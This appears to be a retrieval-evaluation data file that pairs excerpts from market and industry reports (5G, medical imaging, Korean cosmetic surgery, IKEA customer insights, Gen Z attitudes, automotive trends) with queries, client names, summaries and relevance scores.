sensor-based solutions\n(current advanced driver assistance - ADAS) and V2X connectivity will promote automated driving.\n\nDecision and control algorithms: These include decision, planning and control algorithms for a\ncooperative, safe, human compatible traffic automation.\n\nDigital infrastructure: Digital infrastructure (for road automation) includes static and dynamic\ndigital representations of the physical world with which the automated vehicle will interact to\noperate. Issues to address include: sourcing, processing, quality control and information\ntransmission.\n\nHuman factors: Human factors in automation relate to understanding the interaction(s) of\nhumans with all aspects of an automated road transport system (ART), both from within a vehicle,\nwhen taking the role of a driver\/operator and also as a road user, when interacting with automated\nvehicles. Knowledge and theories from social-psychological and behavioural sciences are useful to\nunderstand how humans interact with such systems.\n\nEvaluating road automation: Automation of road vehicles has the potential to impact on\nlifestyles and society. Economic impacts too will be important and it will be necessary to gauge\nthese impacts in a common cost-benefit framework with other transport investments when\nassessing public expenditure on supporting infrastructure or services.\n\nRoadworthiness testing: Roadworthiness testing, understood as the necessary tests to evaluate\nif a vehicle is legally allowed to drive on public roads is of capital importance for the deployment of\nnew automated driving functionalities.\n","summary":"report from the International Transport Forum about the regulation of automated and autonomous driving, published in 2018.","query":"What are the risks of autonomous driving in Europe?","tenant":"Telecom","assessment":"yes","score":0.0000000343}
{"text":"USA\n\n3.7d Surgical X-ray and Interventional X-ray Market - North America\n\nInterventional X-ray market trends:\n\nBasic vascular and orthopaedic procedures continue to be shifted from large hospital facilities to office-based labs (OBLs) and ambulatory service centres, due to favourable reimbursement for\nprocedures performed in lower cost settings. Complex vascular surgery is still performed in hospital facilities which are better equipped with advanced technology such as hybrid operating rooms.\nThe bi-plane market continues to have sizeable growth as a result of an increased number of stroke centres. Additionally, a movement towards having a back-up biplane system in stroke centres of\nexcellence also facilitates further growth in this market. The biplane market will still remain in inpatient settings, and interventional neurology procedures will continue to be informed in hospitals.\nReimbursement for AI-based software solutions for early stroke detection, and a focus on preventative health, should increase the number of patients who are eligible for mechanical\nthrombectomy. The expansion of stroke and neurology programmes will continue to maintain clinical demand. These applications are predicted to remain in inpatient facilities and mostly carried\nout in large hospitals ('spoke and hub' care model). Within the biplane market, 20% of clinical usage is estimated to be for electrophysiology procedures, and 80% for neurology procedures.\n\nSignify\n\nRESEARCH\n\nThe interventional cardiology market is forecast to see strong demand from 2021 onwards, driven predominantly by the replacement of aged fleets, as well as increased demand from outpatient\nfacilities.. Patient eligibility for treatment is also expanding, resulting in an increase in the number of procedures, such as valve replacement, made available to the wider population. A potential\nshift of mitral valve procedures from the operating room to cath labs could fuel demand for cath labs. Cath labs in hospitals have more capacity as a result of increased low risk procedures being\nperformed in outpatient settings, allowing more complicated structural heart and valve procedures to be performed in hospital settings. In the US market, there is higher uptake of advanced\nfeatures such as convergence of modalities, and advanced 3D visualisation features. There is an also a clinical shift from aortic valve replacement to mitral valve surgery in the US market. This will\nencourage growth in the interventional cardiology market. Hybrid operating rooms will also branch into multiple segments in the future. This area is mostly driven by vascular surgery today, but\ngrowth is projected for cardiothoracic surgery. If mitral valve procedures can be transitioned out of hybrid operating rooms and be performed in cath labs, this can cause a shift in the\ninterventional X-ray market.\n\nIn interventional radiology, there is continued expansion of the clinical procedures, such as prostate artery embolization, that are performed by physicians. An increased number of cancer\ntreatments are being facilitated in interventional radiology rooms. The increasing complexity of procedures is driving demand for premium technology. Interventional radiologists and oncologists\nare also performing lymph valve procedures on patients with bone cancer, using multiple modalities and 3D fusion. Within interventional oncology, trans arterial chemoembolization is used to cut\noff the blood supply to a tumor, while radiofrequency ablation (RFA) and microwave ablation may damage the cancerous tissue itself.\n\nGrowth of the interventional cardiology market is highly correlated to annual fluctuations in two procedure types - diagnostic angiography and percutaneous coronary intervention (PCI). PCI is the\nmain treatment for coronary artery disease (CAD), and angiography remains the gold standard for diagnostic coronary procedures. The volume of PCI procedures in the United States is estimated\nat more than 950,000 per year and is forecast to rise through to 2026. Although most PCI procedures are performed in hospital and ambulatory surgery settings, they are increasingly being\nperformed in OBLs. This is a result of favorable reimbursement changes for OBLs, which if maintained, is forecast to increase their share of procedural volumes and hence the market opportunity\nfor interventional X-ray. OBLs also provide greater accessibility for remote regions and better patient outcomes. As the technical capabilities of interventional cardiology continue to advance, OBLS\nare forecast to gradually treat more complex cases in the future. An increased focus on complex PCI patients will drive continued growth in total PCI procedures. Other benefits that OBLs provide\ninclude improved patient outcomes, greater accessibility for remote regions and the option to become accredited as a hybrid OBL-ASC center. Continued innovations in interventional cardiology\ntechnology will enable OBLs to treat more complex cases in the future, though the majority of complex PCI cases are still performed in the hospital setting.\n","summary":"market report published by Signify Research in July 2022, providing information on the world market for interventional and surgical X-ray.","query":"How will the market for angiography for heart attack diagnostic change in the next years","tenant":"Philips","assessment":"yes","score":0.0000000049}

Gangnam, which has been coined the mecca\nof Korea's plastic surgery industry, is predicted to host\napproximately 100,000 foreign plastic surgery patients in\n2019 alone. With 38,546 Chinese (40.5%), 14,624 Japanese\n(15.4%), and 10,125 (10.6%) American recipients, this is a\n31.6% total increase from the previous year.\n\nWhile the Korean Wave indisputably has some degree of\ninfluence on the popularity of Korean cosmetic surgery\ntechnology, the primary reason for its fame can be attributed to\nthe immense domestic demand. Cosmetic procedures in Korea\nliterally begin from the moment a baby is born. One postpartum\ncare centre in Gangnam offers a new born massage service\nthat claims to mould pointier noses and smaller faces, which\nare features that are widely considered to be beautiful in\nKorea. Every December, plastic surgery clinics are packed\nwith high school seniors who have just finished their college\nentrance exams. It has become somewhat of a rite of passage\nfor young students to receive such aesthetic makeovers before\nstarting a new chapter of life.\n\nThe pattern does not stop here. From job seekers looking to\nput their best face forward when applying for companies, to\nengaged couples who wish to look perfect on their wedding\nday, to middle-aged people who want to look younger, people\nin all stages of life have their own reasons for going under\nthe knife.\n\nLIFE IN A LOOKIST SOCIETY\n\nThe elderly are no exception from this cycle, as most desire\nto take care of their skin and get rid of wrinkles. For a woman\nin her 60s, cosmetic procedures are bringing small but\ncertain happiness to her life.\n\n\"When I see my drooping wrinkles in the mirror, I can't help\nbut sigh. I do visit clinics in Seoul occasionally, but they cost\na significant amount of money. At my age, these are little\njoys in life, but it takes a lot of convincing until my husband\ngives in and lets me get procedures. \"- Lee (60s, female)\n\nOf course, men are also highly interested in improving\ntheir appearance.\n\n\"In recent years, there have been quite a lot of middle-aged\nor elderly men visiting plastic surgery clinics. They would\ngo to remove moles and diminish wrinkles as a way to gain\nconfidence or improve their image in terms of business. It is\nnot rare for older married couples in their 70s or 80s to visit\neither. Smaller cosmetic procedures such as fillers, Botox,\nor thread lifts are relatively less burdensome on the body as\nthey only require partial anesthesia. Also, medical technology\nis constantly developing, and consumers are provided with\na wider range of choices. For instance, stem-cell surgeries\nare becoming more and more affordable, and is growing\nas a popular option due to the easy recovery process.\"\n- Kim (medical device company employee)\n\n\"We have a lot of working couples coming in on the\nweekends. Previously, the men would be dragged here by\ntheir wives, but now the husbands are the ones coming\nforward and purchasing facials worth hundreds of dollars.\"\nChoi (aesthetic beauty clinic employee)\n\n\"It's inevitable for men to care about how they appear to\nothers, especially if their field of work requires them to form\nand keep business relationships. A lot of people around me\nhave gotten their eyebrows tattooed and some people wear\nlight makeup on a daily basis. Even though I'm fairly lazy\nwhen it comes to taking care of myself, I try to put on BB\n\nIPSOS BRIEFING | KOREA\n","summary":" Market research report on the beauty and self-care trends in South Korea, focusing on the domestic massage chair market, at-home beauty care, and the importance of self-management and personal care","query":"skinfication trend in korea","tenant":"Unilever","assessment":"no","score":0.0000000003}

{"text":"5G is set to have the\nfastest global roll-out of\nany generation of mobile\nnetwork technology.\n\nThe rise in the number of mobile devices used to watch\nstreamed content has contributed to a rapid increase in\nvideo viewing time. And the amount of embedded video\nin social media and the evolution toward higher resolution\nare further increasing pressure on current networks,\nresulting in degraded video experiences. The previous\nmobile network transition from 3G to 4G offered\nsignificant improvements in video viewing, but it has not\nkept pace with the rapacious consumer appetite for high-resolution video content.\n\nExecuting early commercial launches\n\n5G is set to have the fastest global roll-out of any\ngeneration of mobile network technology. The number of\n5G subscriptions is growing more quickly than expected.\nIn 2018, Ericsson forecast 1.5 billion 5G subscriptions\nglobally by the end of 2024, but rapid early momentum\nand consumer enthusiasm has led the company to adjust\nthis figure in 2019 to 1.9 billion. By 2024, 5G coverage is\nprojected to reach 45 percent of the world's population,\nwhile 5G networks are forecast to carry 35 percent of the\nglobal mobile traffic. The GSMA has a somewhat more\nconservative forecast, estimating 1.57 billion connections\nby 2025.8\n\nAlthough it will take some time to hit critical mass, the\nrace to 5G is clearly on. CSPs in several markets have\ngradually switched on 5G. Timing largely depends upon\nthe availability of 5G-compatible smartphones and 5G\nspectrum allocation, with each country having a schedule\nfor either reserving, auctioning, or making formal plans\nfor 5G spectrum.\n\nSouth Korea started its first 5G commercial networks\non April 4, 2019, and surpassed the three million\nsubscriber mark five months later. 5G coverage now\nreaches almost all of the country's population. Data use\nhas surged on South Korea's 5G networks as a result of\nultra-high definition (UHD) 5G live broadcasting and\nentertainment applications such as augmented reality\/\nvirtual reality (AR\/VR) gaming. \u00b9\u2070\n\n10\n\nIn spring 2019, Verizon, AT&T, Sprint, and T-Mobile\nbegan rolling out networks in a number of US cities with\n5G speeds and faster wireless connections. Verizon has\nalso launched its new 5G network in sports venues-such\nas those of the NFL and NBA-across the US.\u00b9\u00b9 GSMA\nforecasts that 5G will account for almost half of all mobile\ncommunications in North America by 2025.\u00b9\u00b2\n\nChina has invested heavily in the transition to 5G. Since\nNovember 1, 2019, China has had the largest 5G network\navailable for commercial use, with the three major Chinese\nproviders offering 5G services to users. 13 Their networks\noperate in 50 of China's major cities, with 12,000 active\n5G base stations supporting coverage. By 2025, China\nis expected to account for more than 40 percent of the\nworld's 5G connections. \u00b94 In 2019, commercial 5G\nnetworks were also launched in-among others-Germany, Switzerland, and the UK.\u00b95\n\nCreating private 5G networks\n\nTo enable full deployment and commercialization of 5G,\nCSPs need sufficient spectrum within specific frequency\nranges. Many of them are already involved in 5G spectrum\nauctions. However, CSPs can no longer be assumed to be\nthe default connectivity providers. 5G could see explosive\ngrowth in private enterprise networks, according to a\nGSMA Intelligence report.\u00b96\n\nThis nascent movement toward allocating spectrum for\nenterprise-as opposed to operator-use will likely fuel\ndemand within the next five years. Manufacturers, for\ninstance, might opt to build private 5G networks for their\nin-factory applications.\n\nThe US Federal Communications Commission (FCC) has\nalready approved initial commercial deployments for\nCitizens Broadband Radio Services (CBRS) in the 3.5 GHz\nmid-band spectrum for 5G.\u00b97 Germany has carved out\nspectrum for private licenses in its 5G allocations, even\nwithout auctioning but instead assigning spectrum to\napplicants on request. \u00b98 BMW, Volkswagen, and Daimler\nhave already expressed interest in operating private 5G\nnetworks for their German plants.\u00b9\u2079\n\n18\n\nFor operators, this means that infrastructure competition\nbecomes harder and that \"frenemy-style\" partnerships\nwith adjacent industries become the norm rather than the\nexception.\n\n3\n","summary":" Research insights report from IBM Institute for Business Value, exploring the potential of 5G technology to create new revenue streams and services for communications service providers in the future","query":"What is the demand for 5G in United States?","tenant":"Telecom","assessment":"yes","score":0.000000006}

{"text":"Foreword\n\nThis report could not come at a more important time. With household\nbudgets at their most stretched, this is a timely opportunity to assess how\ngovernment policy will increase the cost of families' shopping baskets.\n\nThe Government's recipe for food price inflation\n\nThat food prices are under immense pressure has been acknowledged at the\nhighest level. Earlier this year, Andy Haldane, the outgoing Chief Economist\nof the Bank of England, highlighted the fact that food commodity prices have\nincreased by around 17% since the start of the year. More recently, a United\nNations report stated that food commodity inflation has accelerated to a\n40% year on year increase.\n\nThis report looks at seven different policies coming from either the\nsustainability or public health policy arenas. The combined cost of these\npolicies to our sector over the next three years will be \u00a38.3bn. With very little\nmargin left for food and drink manufacturers to absorb any of these costs,\nthe burden will have to be passed directly on to shoppers. The cost of food\nand drink shopping per household would increase by more than \u00a3160 per\nyear. The poorest households would see their shopping bills increase by\n11%, roughly equivalent to the average proportion of their annual food shop\nthat goes to fresh vegetables; a perverse result from a government that rightly wants to promote healthy eating.\nAnd then there's inflation!\n\nPolicy making does not happen in a vacuum. It is right that the Government responds to pressing concerns around\nsustainability and obesity. But it is also incumbent on government to bring forward effective policy.\n\nFood and drink manufacturers want to sell to a fit and healthy nation. Unhealthy customers are very bad for our\nbusiness, so it is a matter of great regret for us that the obesity policies currently being proposed by Government will\nhave a negligible impact on calorie intakes. In the same vein, the proposed reform of Extended Producer Responsibility\n(EPR) cannot be constructed as an open-ended cost commitment if its desired outcomes for the environment are\nto be realised. As it is put together, full transparency of the costs of the system must be assured. Producers have a\ncentral role in delivering the UK's circular economy. A badly designed EPR system will only set the UK further back\nwhen compared to other leading economies, with hardworking families having to pick up the bill.\n\nToo often policy debates take place in a bubble in and around Westminster. Government, business and NGOs and\ntheir lobbyists push doctrinaire policy programmes with no thought of the cost for those impacted. As this useful and\nprescient report sets out, Government policy must take account of our nation's families - surely the most important\nstakeholder. After all, in the end it is they who will pay.\n\nIan Wright, CBE\n\nChief Executive\n\nFood and Drink Federation\n","summary":" Report on the cost of seven different government policies to the food and drink industry over the next three years, with the cost of these policies to the","query":"Welchen Einfluss hatte die Inflation auf die Ausgaben?","tenant":"Poc11","assessment":"yes","score":0.0}

Our\nnew analysis shows no real differences in levels of trust among\nthe young with regards to all sorts of traditional institutions. It's\ntrue, Millennials did mark a low point in trust in others [we're not\nsure why - maybe a sense of betrayed promises of progress),\nbut now they are ageing, the differences are decreasing\nand Gen Z start adult life with much higher levels of trust.\n\nThis does not mean that institutions and established brands\nhave no challenges with the young, it's just that declining\ntrust is not the source. Frankly it is a cop-out, implicitly\nblaming consumers and citizens rather than encouraging\nbrands and institutions to look at themselves. The issues are\nmuch more about efficacy, relevance and leadership.\n\n3. Just as caring: technology has been democratising in\nmany ways, including in making age, seniority or established\nconnections a lot less important to whether you can have\nan impact or not. There are so many examples of young\npeople starting movements that change things or bring\npressure on those in power, in a way that would have\nbeen much more difficult in the past (without denying the\nimportance of student-led movements since the 1960s).\n\nBut this does not mean that Gen Z are a cohort of activists.\nNeither are they selfish snowflakes, too busy watching\nYouTube videos of people eating Tide Pods.

Known as the 'Jara project',\nthis four-year deal is the largest IT initiative in Spain to redesign existing healthcare\nprocesses and integrate dispersed information systems to enable healthcare professionals\nto provide citizens with a higher-quality healthcare service.\n\nThe European healthcare IT market is highly competitive and rapidly evolving. It is subject to\ntechnological changes and the need to gain market presence. The industry is highly competi-tive because major vendors are developing patient-centric solutions focusing on the end-users. In 2005, the European healthcare IT market was highly fragmented with local vendors,\nknown for their legacy systems, retaining a strong position. However, a lack of resources to\nupgrade their technology has forced them to develop various other strategies to thrive in the\nmarket. There has to be a value differentiator in terms of the services they offer and this\nbrings us to the concepts of outsourcing and managed services. Moreover, most hospitals in\nEurope do not have adequate in-house IT expertise, thus making it imperative for technology\nproviders to offer a managed service along with their solution to create a sales opportunity.\n\nThe concept of managed services involves selectively outsourcing the management of specific\nparts of an organization's IT infrastructure without the need for any whole-scale transfer of\npeople or assets to a third party and as well as the removal of any control from the organiza-tion. Furthermore, unlike outsourcing, the managed services approach is typically driven by a\nwider desire not only to reduce costs, but also to improve the availability, performance, resil-ience and security of an organization's IT systems without the need for additional in-house\nskills and resources.\n\nAlthough, a number of factors seem to be working in favour of the healthcare IT managed\nservices market, service providers will have to overcome certain challenges to capitalize on\nthis opportunity. This white paper from Frost & Sullivan gives an overview of the European\nhealthcare IT managed services market in Europe from 2006 to 2010. In addition it provides\nan insight into the value propositions of managed services, their classification, the competi-tive sturcture, and also offers strategic recommendations to vendors and service providers to\nensure success in a dynamic technology environment.\n","summary":"market research report on European healthcare IT managed services markets, published by Frost & Sullivan in 2020.","query":"Who are the biggest service offering providers in the uk","tenant":"Philips","assessment":"yes","score":0.0000000173}

IKEA's biggest experience driver is our co-workers.\nStill, many frustrations with their availability and\nfriendliness\n\nEase of shopping is our customer #1 pain point (FY22T3).\nHard to reach out to IKEA and unexpected waiting times are\nthe main root causes. In store, the waiting times at check-out are unacceptable, while on web the exploration, online\nordering\/payment process and (notifications around)\ndelivery cause frustrations.\n\nDamages is #2 pain point, and it is becoming worse, mainly\ncaused by parcel deliveries. Damages have a ripple effect.\nNot only related to Services but on top, negative experience\nwith the Support meeting point\n\nStock availability is the #4 frustration but slowly loosing\nvolume and winning sentiment. Lack of communication\naround stock has a ripple effect on many CX drivers.\n\nAffordability sentiment score lost positive sentiment due\nto the price of our products and disappointment around\npromotions (and most probably inflation). Delivery fees do\nnot meet customer expectations. Our Value for money is\nconsistently declining\n\nRANGE INSIGHTS\n\nLevels of acceptance & rejection across both HFA and\nfurniture remain broadly stable from last year\n\nAcceptance and rejection varies by category, but in some\nnon-core product categories like Kitchen Appliances and\nSmart Speakers lack of awareness is still an issue\n\nThe overall stable performance is reflected across the\nwhole range with nearly all categories also showing a\nrelatively stable level of acceptance\n\nSpontaneous awareness, and consideration (acceptance)\nremain stable this year but preference and purchase\ndecline\n\nPerceptions of IKEA based on our Democratic Design\nprinciples have not moved much in the past 5 years\n\nPrice, followed by form and quality are strongest driver of\nacceptance for the IKEA range, however losing importance.\nOther measures like convenience, sustainability and services\nare increasing\n\nAFFORDABILITY INSIGHTS\n\nAt a global level, whilst most people can afford home\nfurnishing, less and less people are able to afford IKEA\n\nPrice is one of the key choice driver and trigger to purchase\nfor consumers. IKEA increased prices more than\ncompetitors (22.8% vs 9.6%) (FY22). Factoring in delivery\ncosts, we are even less competitive\n\nIn FY22 67% of IKEA products are priced higher than\ncompetition\n\nWhilst price is the strongest purchase driver, it is losing its\nimportance as consumers become more demanding,\nasking for low price but also better quality, more\nconvenience, better services and more sustainable solutions\n\nQuality is a greater concern to those with thick wallets,\nother main concern is accessibility. Price is then a focus of\nthin wallets\n\nOver the past 7 years, IKEA's Affordability perceptions have\nbeen stable but in FY22 our strength is starting to be\nchallenged and customers' perceptions of IKEA being\nAffordable and Offering low prices have dropped\n\nValue for money remains the customers' most important\npriority Value is more than just a \u201cnice\" price; it also\nencompasses quality, convenience, experience, authenticity,\ncorporate social responsibility and more.\n\nInternal\n\nSUSTAINABILITY INSIGHTS\n\nSustainability is the top driver for building trust in IKEA as\na brand, while its #4 driver for purchase.

Regarding electronic devices for personal use and household appliances, we found that\nGeneration Z is less willing to delay the purchase (only 35% Gen Z compared to 55% non-Gen Z).\n\nSUMMARY AND IMPLICATIONS\n\nWe can conclude that it is worth it considering Gen Z as a separate group with its own emotions, attitudes,\nand saving strategies regarding price inflation. The results and implications can be summarized followingly:\n\n\u2022 Although both age groups are affected emotionally by the current price inflation and feel that it is\nimpacting their personal financial situation, Gen Z finds their daily lives less influenced and has a\nmore positive attitude towards future development. Companies and marketers targeting Zoomers\nshould take this topic seriously but from a positive perspective by, for example, focusing on what is\npossible, and talking about rewarding yourself with something small rather than bringing out the\nnegative side or the limitations of price inflation.\n\n\u2022 The top saving categories of the past 6 months and categories in which consumers plan to save in the\nnext 6 months are comparable for Gen Z and non-Gen Z. However, the percentage of Generation Z\nconsumers saving on these categories is lower compared to the older age group. Meaning, Gen Z is\nmore positive about the situation than the older generation: the percentage of Gen Z that indicates\nsaving less or no longer saving is higher for almost all measured categories compared to non-Gen Z.\n\u2022 When it comes to \"bigger\" purchases like holidays, clothing, and home improvements, Generation Z is\nmuch less willing to delay expenses, a common saving strategy applied by non-Gen Z. Instead, Gen\nfinds ways to realise the purchase by for example finding cheaper options online, thrifting or using\npackage deals. On the other hand, for daily groceries, Gen Z is less willing to make efforts than non-Gen Z (comparing offers, buying cheaper alternatives, going to the discounter, etc.).\n\n\u2022 For marketers of bigger purchases or for Gen Z's important purchases this provides nice\nopportunities to guide and aid Gen-Z on their consumer journey.\n\nArticle by Sonja van den Berg & Sasha Perozo Alberti & Veronika \u010celadn\u00edkov\u00e1\n\nDelen\n\nWij maken gebruik van cookies, om onze website te verbeteren, om het verkeer op de website te analyseren en om de website naar behoren te laten werken.

Among school\nchildren in Britain, there seems to have been a cohort shift\ntowards higher social activism - particularly in terms of giving\ntime informally and regularly to the community. Nearly half of\n14-16 year olds [46%) say they have given their time to help\nout people in the community in the past two years, compared\nwith just 30% in 2005. And three in ten [29%) are regularly\nactive in their neighbourhood, community or an ethnic\norganisation compared with just one in ten (10%) in 2005.\n\nAlso, more see themselves getting involved in the future\n- half (50%) of 14-16 year old Generation Z say it's likely\nthey'll work with an organisation or charity to help people\nin need, compared with 43% of 14-17 year old Millennials\nin 2005. Little evidence of selfish tendencies here.\n\ncampaign\n\nThese changes may be a reflection of a UK-wide push\ntowards youth schemes encouraging young people to\nparticipate in the community. For example, the\npartners with over 700 businesses, schools and charities to\nencourage social action among 10-20 year olds. The spread\nof the National Citizen Service (NCS) has led to an estimated\n400,000 young people in the UK taking part in its three to four\nweek programme encouraging social mixing, embracing\nchallenges, having greater responsibility and independence,\nand becoming involved in social action in communities.136\n\nBeyond Binary\n\nIn contrast, in the US there's no evidence that Generation Z are any\nmore selfish or any more active than previous generations of young\npeople - volunteering rates among US teenagers are fairly stable.\nIn 2002, 27% of US Millennials (16-19 year olds] volunteered at least\nonce a year, which is on a par with US Generation Z teens today.\nEthical young consumers\n\nA final and important thing to note is the increase in British\nteenagers who say they have avoided certain products because\nof the conditions under which they were produced or what\nthey are made from - from 19% in 2005 to a quarter [26%) in\n2018. Considering Millennials were often [wrongly it turned out]\nidentified as the generation leading the revolution towards\nmore ethical purchasing, this is an interesting finding and could\npossibly indicate the beginning of a generation growing up in\nsociety which is much more concerned and aware of issues\nrelated to ethical products. This is likely to reflect the fact that\nthese discussions are embedding into the media and more\ncompanies' core strategy - the environment is changing and\nthe latest generation of young seem to be picking up on it.\n\nFINAL THOUGHTS...\n\nSpeculation about what kind of citizens Generation Z will be\nis ramping up - will they vote, how will they vote, are they\nconservative, are they liberal, will they be more involved in the\ncommunity? In truth there are elements of increased social\nactivism, but also political inertia within Gen Z - the likes of which\nended up prompting the media to give Millennials [the rather\nharsh, and arguably misplaced) nickname of 'selfish snowflakes'.\n\nFrom the snowflake angle, there is clearly a disconnect\nbetween young people and political involvement that has\nnot been solved in Gen Z.

{"text":"ALPORT SYNDROME MANAGEMENT\n\nROUTINE FOLLOW UP\n\nThe frequency of routine appointments is often annually or six-monthly. For children and teens,\npediatric appointments were often every 3 or 6 months. In the teenage and young adult Pediatric\nAlport Insight Project 40% patients described having 1 visit annually, 24% 2-3 visits and 36% 4 or more\nvisits annually. These usually happened at a hospital, occasionally at a specific 'Alport clinic' in an adult\nor children's nephrology department. However, patients said the frequency changed over time,\ndepending on their results and health. Typically, when routine test results start to indicate a slow\ndecline, then the check-ups became more frequent.\n\nFor those with normal to mild kidney function decline, the most frequent procedures at check-ups are\nblood tests, urine or dipstick tests, blood pressure, weight and height check. Pediatric patients also\ntypically have checks for any mineral abnormalities as they may affect their growth. People tend to\ndescribe those visits as a routine. Important to note, although these assessments may seem very basic\nand should not be time consuming, they often require a day off either from work or school due to\ntravel and them being scheduled in the middle of the day. The organizational approach to this, clearly\ndiffered between UK and USA, where patients tried to book the visits and tests during holidays in the\nlatter (probably due to sick leave regulations and reimbursement differences). Some people (young\nadults) describe those even as being pointless and have a history of dropping off attending\nappointments for a period of time (see Special Focus: Teenagers and Young Adults). The lack of\nadherence to routine follow up was correlated to them being either falsely reassured that they would\nnot experience symptoms or kidney function decline till late stages of their life and being uneducated\nabout the disease.\n\nPatients report anxiety in anticipation of results. Many of them mention feeling more in control when\nthey are able to check their own results e.g. online and have the ability to have a quick call with the\ndoctor. This helps with stress management. Particularly in UK, it seems there is a tendency of blood\nbeing taken, but no contact made with the patient unless the results are abnormal.\n\nPatients mentioned on occasion that their standard of care sometimes changed when moving\nhospitals. This was particularly highlighted as a problem during pediatric to adult physician shift (see\nSpecial focus: Teenagers and Young Adults).\n\nSPECIAL FOCUS: CAR ERS\n\nHistorically, Alport diagnosis and treatment was primarily focused on males with X-linked disease. The\nfemales were merely characterized as carriers and they did not receive follow up and disease\nmanagement. Currently, nephrology centers and specialists recognize that women with X-linked\ndisease are indeed patients who need to be monitored on regular basis and prescribed ACE\/ARB\ntreatment. Nevertheless, the old perception still prevails in the medical community. In the patient\ninterviews the lack of monitoring has been notoriously mentioned. Female patients complained of\nbeing misinformed about what the Alport diagnosis really mean and being told that it will have\nnegligible effect on their lives, as they are just \u201ccarriers\". They were not made aware that they can\ndevelop the same symptoms and outcomes as men and that they should be followed up life-long.\nDespite current recommendations to start ACE\/ARB for women at the onset of microalbuminuria,\nsome female patients reported that they did not receive treatment at that stage.

Among the fastest growing major\nsnack categories, ice cream can further tap into parents' demand\nfor customised products for their children.\n\nAccording to Mintel's Impact of COVID-19 in Chinese Consumer\n- May, 2022, 44% of consumers have stocked up on snacks\nand 40% for dairy products in the past three months, ranking\nafter convenient meal solutions, fresh produce and cooking\ncondiments. Growing time spent at home may benefit in-home\nconsumption of packaged ice cream, which is among consumers'\nprimary considerations whether they're happy, nostalgic, anxious,\nlonely or encountering setbacks.\n\nIce cream has become a popular category for entry by adjacent\nfood and drink brands such as Mars and Maotai. In addition,\nnew retail brand Hema also collaborated with coffee house Tims\nHortons and plant-based drink brand Oatly in launching ice cream\nproducts with its iconic hippo face. The entry of new players will\nintensify the competition within the category and change the\ncompetitive landscape.\n\nAlthough taste is of most importance when choosing ice cream,\nit's important for ice cream brands to cater to the healthy\nevolution trend which has already taken place in other food and\ndrink categories under the growing priority of healthy eating.\nTURF analysis shows that if only two factors were considered,\n81% of respondents think \"flavour\" and \"nutrition\" are most\nimportant to them when choosing packaged ice cream, revealing\nthe importance of fortified nutrition in further encouraging\nconsumption.\n\nKey issues covered in this Report\n\nFuture market outlook and growth prospects in the next five\nyears\n\nCOVID-19's impact on the ice cream market and market value\nforecast under different scenarios\n\nLatest product trends and growth opportunities\n\nConsumption trends and changes in product usage\n\nPerception of different ice cream formats\n\nChoice factor and preferred flavours when making purchase\ndecisions\n\nCovered in this Report\n\nThe market size covers all packaged ice cream, sorbets and\nwater ices in individually wrapped and multipack format.\nPopsicles, bricks, sandwiches, cups, tubs, and buckets are\nincluded.

{"text":"units used have been mostly of the compact type and they are typically used by surgeons to help\nperform office procedures.. This small market was $7 million in 2019.\n\n4. Current suppliers to the surgery market\n\nIn 2019, three manufacturers have been identified that offered ultrasound systems for sale to the\noffice market segment. These include GE, Mindray, and SonoSite. In the more sophisticated\nOR\/surgery market, there are only two suppliers. They include BK Ultrasound, the market\nleader, and Hitachi.\n\n5. Size of the total surgery market in units & dollars (2018 & 2019)\n\nThe size of the total surgery market, including both segments, was 515 units having a total\ndollar value of $52 million in 2019. This compares with 485 units and $50 million in 2018.\n\n6. Company sales and market shares (2018 & 2019)\n\nData are presented in Table 62, which is found on pages 3 and 4. Note that this table is divided\ninto two parts: the hospital market and the office market.\n\nIn 2019, BK Ultrasound was the market leader in the hospital market with a 67% share in\ndollars. The company picked up about three percentage points in share. Hitachi had the\nremaining 33%.\n\nIn the surgery\/office segment, GE and SonoSite were tied for the market leadership position\nwith each having a 43% share. They were followed by Mindray with the remaining 14% share.\n\n7. Market forecast discussion\n\nThe hospital surgery market, in particular, has always been a difficult to forecast. Despite the\ntremendous market potential for these systems based on the many thousands of hospital ORs\nand the millions of surgical operations that are performed each year, the market has not yet\ndeveloped into an important ultrasound market. It still remains short of the $50 million mark,\nalthough it gets closer with each passing year. Perhaps, if more competitors entered the market,\nwhich appears highly unlikely, it might stimulate its growth.\n\nThe trend in surgery is toward performing procedures with minimally invasive techniques\n(MIS) wherever possible, since it allows for shorter recovery time for patients. As more MIS\ntechniques are developed, it is believed that a greater percentage of surgical operations will be\nperformed using less invasive techniques, which should have a positive effect on the use of\nultrasound. Longer term, the availability of 4D capability on surgery machines could eventually\nhave a positive impact on market growth, but so far its impact has been minimal. There is a\nlarge installed base of high-end surgery machines in hospitals (about 7,000 units) and it is\nexpected that many of these units will have to be replaced over the forecast period. The growth\nin the use of robotic surgery has not had a positive impact on the growth of the market, since\nultrasound will have competition from other imaging technologies.\n\nXIII-2\n","summary":" 2019 report from Klein Biomedical Consultants, Inc. providing an overview of the medical diagnostic ultrasonic market in the USA, including challenges and opportunities in the new millennium","query":"what is the market size of Ultrasound","tenant":"Philips","assessment":"yes","score":1.0}
{"text":"8\n\nMOTIVATION\n\nToday, the automotive supply chain is struggling with shrinking margins and increasing\ninvestments. However, these are necessary to remain competitive. [1] Furthermore,\nthere are trends that are currently having a lasting impact on the automotive industry:\nThe transformation-inducing developments around the acronym ACES. These include\nautonomous driving, digital connectivity between driver and vehicle, electrification\nof powertrains, and shared mobility. [2] This means that cars are becoming environ-mentally friendly and less equipped with combustion engines. Moreover, they are\nbecoming more and more connected as well as autonomous in their driving ability\nand can be shared with other people.\n\nThese trends are already noticeable today. Worldwide, the demand for driver assis-tance systems is rising. In Europe, China and the U.S., the market volume of these\nsystems, and that of autonomous driving functions, is expected to increase more than\ntriple between 2020 and 2030 to as much as EUR 270.2 billion. [3] The Situation in\nautomotive connectivity, which is also expected to grow continually, can be found\nin a similar way. [4] In addition, the number of electric cars worldwide has grown\nto 10.9 million electric cars in 2020 (up 3 million year-on-year), making the global\nelectric car count 50 times larger than it was in 2012. [5] Furthermore, in Germany,\nfor example, steady growth is showing in the number of car-sharing vehicles, which\nrepresent a part of shared mobility. [6]\n\nExperts from the automotive industry see the politically desired electrification of the\nautomotive market as a driver of these trends. However, environmentally driven goals\nare also seen as triggers for the electrification of traffic, which are related to ACES\ntrends such as autonomous driving and the increasing percentage of software in\nautomobiles.\n\nTHE TRANSFORMATION OF THE AUTOMOTIVE INDUSTRY\n\nThe move to electric motors will reduce the number of components needed. For\nexample, electric drive systems do not need the drivetrain or related components\nsuch as the starter, petrol tank or exhaust system. While a conventional drivetrain has\nthousands of components, an electric vehicle only has several hundred and thus a\nfraction of the total components. Certain suppliers specializing in internal combusti-on engines are expected to have difficulties 